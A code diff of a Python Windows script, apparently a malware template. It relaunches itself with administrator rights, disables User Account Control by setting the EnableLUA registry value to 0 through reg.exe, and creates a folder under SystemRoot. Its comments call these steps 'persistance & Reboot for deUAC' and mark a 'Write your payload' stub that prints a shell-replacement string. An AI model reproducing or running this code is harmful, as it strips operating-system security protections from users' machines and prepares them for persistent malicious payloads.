@@ -3,7 +3,7 @@
 import os
 import sys
 
-# win32com.shell이 아닌 win32comext 이다
+# On pywin32 Use win32comext in 2022
 import webbrowser
 from shutil import copyfile
 
@@ -14,14 +14,16 @@ ROOT_PATH = os.environ['SystemRoot']
 
 
 if __name__ == '__main__':
+
+    # If Run as User, Run as Administrator
     if sys.argv[-1] != ASADMIN:
         script = os.path.abspath(sys.argv[0])
         params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
         shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
         sys.exit()
 
+    # Add persistance & Reboot for deUAC
     if os.path.isdir(os.path.join(ROOT_PATH,'Winx')) is False:
-        # root 파일을 레지스트리에 등록
         try:
             os.mkdir(os.path.join(ROOT_PATH,'Winx'))
             os.system('reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')
@@ -31,6 +33,7 @@ if __name__ == '__main__':
         except FileExistsError:
             pass
         sys.exit()
+
     # Write your payload
     print(f'/d "explorer.exe,{ROOT_PATH}\\{PROG_NAME}"')
     webbrowser.open('http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg')
